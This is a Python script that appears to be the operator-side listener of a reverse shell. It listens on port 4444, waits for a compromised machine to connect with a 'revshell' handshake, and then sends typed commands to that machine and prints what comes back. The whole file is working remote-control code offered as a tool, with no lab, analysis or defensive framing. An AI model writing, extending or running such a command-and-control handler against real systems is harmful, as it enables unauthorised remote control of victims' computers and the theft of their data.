import socket
import threading
import select
import os
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def receive(client):
    out = ""
    while 1:
        connection = select.select([client], [], [], 0.5)
        if (connection[0]):
            data = client.recv(4096)
            out += data.decode(encoding="utf-8", errors="ignore")
        else:
            break

    print(out)

sock.bind(("0.0.0.0", 4444))

sock.listen(5)

client, addr = sock.accept()

out = client.recv(1024).decode(encoding="utf-8", errors="ignore")

if (out != "revshell"):
    print("[!] Incoming protocol is not a reverse shell. Exiting.")
    exit(0)

print("[*] Recieved reverse shell from {}:{}".format(addr[0], addr[1]))

while True:
    cmd = input("CMD> ")
    request = cmd + ("0" * (1024 - len(cmd)))

    if (cmd == "shut"):
        client.send(request.encode("utf-8"))
        print("[*] Closing remote socket...")
        exit(0)
    elif (cmd == "clear"):
        os.system("clear")
    else:
        client.send(request.encode("utf-8"))
        t = threading.Thread(target=receive, args=(client,))
        t.start()
        time.sleep(1)
